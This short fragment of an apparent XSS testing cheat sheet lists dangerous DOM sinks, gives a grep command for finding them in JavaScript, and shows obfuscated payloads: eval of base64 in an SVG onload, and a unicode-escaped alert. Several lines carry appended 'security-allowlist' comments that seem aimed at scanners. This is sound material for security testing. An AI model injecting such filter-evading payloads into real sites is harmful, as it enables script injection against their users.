...
location.href
document.referrer
eval( <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
setTimeout(string,
setInterval(string,
$.html(
$(location
...
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js" <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
...
```javascript
// Obfuscated payloads
<svg onload=eval(atob('YWxlcnQoMSk='))> <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
// String splitting
<script>ale\u0072t(1)</script>
